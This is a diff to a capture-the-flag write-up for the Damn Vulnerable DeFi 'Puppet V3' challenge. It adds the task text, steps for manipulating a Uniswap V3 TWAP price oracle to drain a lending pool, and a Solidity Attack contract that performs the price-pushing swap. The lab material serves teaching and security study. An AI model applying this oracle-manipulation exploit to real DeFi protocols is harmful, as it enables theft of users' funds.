@@ -1204,18 +1204,93 @@ function test_walletMining() public checkSolvedByPlayer {
 
 #### Task: 
 
+Bear or bull market, true DeFi devs keep building. Remember that lending pool you helped? A new version is out.
+
+They’re now using Uniswap V3 as an oracle. That’s right, no longer using spot prices! This time the pool queries the time-weighted average price of the asset, with all the recommended libraries.
+
+The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT tokens.
+
+Starting with 1 ETH and some DVT, you must save all from the vulnerable lending pool. Don't forget to send them to the designated recovery account.
+
+_NOTE: this challenge requires a valid RPC URL to fork mainnet state into your local environment._
+
+
 #### Solution Explanation:
 
+The task is to exploit a vulnerability in a lending pool that uses Uniswap V3 as a time-weighted average price (TWAP) oracle between WETH and DVT tokens. The goal is to drain the pool of all DVT tokens using a limited amount of ETH and some initial DVT tokens.
 
+Solution Steps
 
+1.	Initialization and Setup for the Attack:
+	-	The Attack contract is initialized, passing in the PuppetV3Pool lending pool address, DVT and WETH token addresses, the Uniswap pool address, and the designated recovery address.
+	-	The PLAYER_INITIAL_TOKEN_BALANCE (the initial DVT balance given to the player) is transferred to the Attack contract.
+2.	Manipulating the Price on Uniswap V3:
+	-	The Attack contract calls the attack function to manipulate the price using Uniswap V3.
+	-	The swap function in Uniswap V3 is invoked, initiating a swap to temporarily change the DVT/WETH price. Since the PuppetV3Pool relies on TWAP to determine the required collateral, this price manipulation allows us to artificially lower the collateral required for a large DVT loan.
+3.	Supplying Collateral for Loan with Manipulated Price:
+	-	After manipulating the price, only a small amount of WETH is required to borrow a large number of DVT tokens due to the modified price in PuppetV3Pool.
+	-	The contract then waits briefly to ensure that the manipulated TWAP is established using the skip method.
+4.	Completing the Attack and Transferring Tokens to Recovery Address:
+	-	The borrowed DVT tokens are transferred to the recovery address, completing the exploit.
 
-
-- [x]  Puppet V3
-
-так же как и те паппеты просто v3 устроен сложнее (сделать описание по тикам)
 
 <details>
   <summary> Code </summary>
+
+```solidity
+
+contract Attack is IUniswapV3SwapCallback{
+    PuppetV3Pool public immutable pool;
+    DamnValuableToken public immutable token;
+    IUniswapV3Pool public immutable uniswap;
+    WETH public immutable weth;
+    address public immutable recovery;
+
+
+    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
+    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
+    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+    uint24 constant FEE = 3000;
+    
+    error Merde(uint256);
+    
+    constructor(PuppetV3Pool _pool, DamnValuableToken _token, IUniswapV3Pool _uniswap, WETH _weth, address _recovery) {
+        token = _token;
+        uniswap = _uniswap;
+        pool = _pool;
+        recovery = _recovery;
+        weth = _weth;
+    }
+
+    function attack() public payable {
+        (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked) = uniswap.slot0();
+        uint160 sqrtPriceLimitX96 = TickMath.MIN_SQRT_RATIO + 1;
+        require(sqrtPriceLimitX96 < sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO, 'KEK');
+        token.approve(address(uniswap), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswap.swap(
+            address(this),
+            true,
+            int256(PLAYER_INITIAL_TOKEN_BALANCE),
+            sqrtPriceLimitX96,
+            ""
+        );
+    }
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external override {
+        if (amount0Delta > 0) token.transfer(address(uniswap), uint256(amount0Delta));
+    }
+
+    function getETH() public {
+        weth.transfer(msg.sender, weth.balanceOf(address(this)));
+    }
+}
+```
 
 ```solidity
 function test_puppetV3() public checkSolvedByPlayer {
